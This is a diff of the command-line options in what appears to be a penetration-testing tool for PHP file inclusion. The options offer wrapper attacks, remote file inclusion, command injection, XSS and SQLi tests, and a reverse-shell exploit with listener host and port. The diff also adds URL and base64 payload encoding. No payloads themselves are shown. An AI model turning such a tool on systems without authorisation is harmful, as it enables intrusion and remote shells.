-    attackGroup.add_argument('-d', '--data', action = 'store_true', dest = 'php_data', help='\t\t Attack using data:// wrapper')
-    attackGroup.add_argument('-e', '--expect', action = 'store_true', dest = 'php_expect', help='\t\t Attack using expect:// wrapper')
+    attackGroup.add_argument('-f', '--filter', action = 'store_true', dest = 'php_filter', help='\t\t Attack using filter wrapper')
+    attackGroup.add_argument('-i', '--input', action = 'store_true', dest = 'php_input', help='\t\t Attack using input wrapper')
+    attackGroup.add_argument('-d', '--data', action = 'store_true', dest = 'php_data', help='\t\t Attack using data wrapper')
+    attackGroup.add_argument('-e', '--expect', action = 'store_true', dest = 'php_expect', help='\t\t Attack using expect wrapper')
     attackGroup.add_argument('-t', '--trunc', action = 'store_true', dest = 'trunc', help='\t\t Attack using path truncation with wordlist (default "short.txt")')
     attackGroup.add_argument('-r', '--rfi', action = 'store_true', dest = 'rfi', help='\t\t Attack using remote file inclusion')
     attackGroup.add_argument('-c', '--cmd', action = 'store_true', dest = 'cmd', help='\t\t Attack using command injection')
-    attackGroup.add_argument('--file', action = 'store_true', dest='file', help='\t\t Attack using file:// wrapper')
+    attackGroup.add_argument('--file', action = 'store_true', dest='file', help='\t\t Attack using file wrapper')
     attackGroup.add_argument('--xss', action = 'store_true', dest = 'xss', help='\t\t Test for reflected XSS')
     attackGroup.add_argument('--sqli', action= 'store_true', dest= 'sqli', help='\t\t Test for SQL injection')
     attackGroup.add_argument('--info', action= 'store_true', dest= 'heuristics', help= '\t\t Test for basic information disclosures')
     attackGroup.add_argument('-a', '--all', action = 'store_true', dest = 'test_all', help='\t\t Use all available methods to attack')
     
     payloadGroup = parser.add_argument_group('PAYLOAD OPTIONS')
+    payloadGroup.add_argument('-n', type=str, action='append', metavar='<U|B>', dest='encodings', help='\t\t Specify payload encoding(s). "U" for URL, "B" for base64')
     payloadGroup.add_argument('-x', '--exploit',action='store_true', dest='revshell', help='\t\t Exploit to reverse shell if possible (Setup reverse listener first)')
     payloadGroup.add_argument('--lhost', type=str, metavar='<lhost>', dest='lhost', help='\t\t Specify local ip address for reverse connection')
     payloadGroup.add_argument('--lport', type=int, metavar='<lport>', dest='lport', help='\t\t Specify local port number for reverse connection')
@@ -1785,6 +1795,12 @@ if(__name__ == "__main__"):
                 if(not exists):
                     tempArg = item
                     break
+
+    if(args.encodings):
+        for e in args.encodings:
+            if(e != "U" and e != "B"):
+                print("[!] Invalid payload encoding specified. Please use 'U' for url or 'B' for base64 encoded payload.")
+                sys.exit(-1)
 
     if(mode == "file" and args.revshell):
         print("[!] Specifing multiple url testing with '-F' and reverse shell attack with '-x' is NOT RECOMMENDED, unless you know what you're doing.")
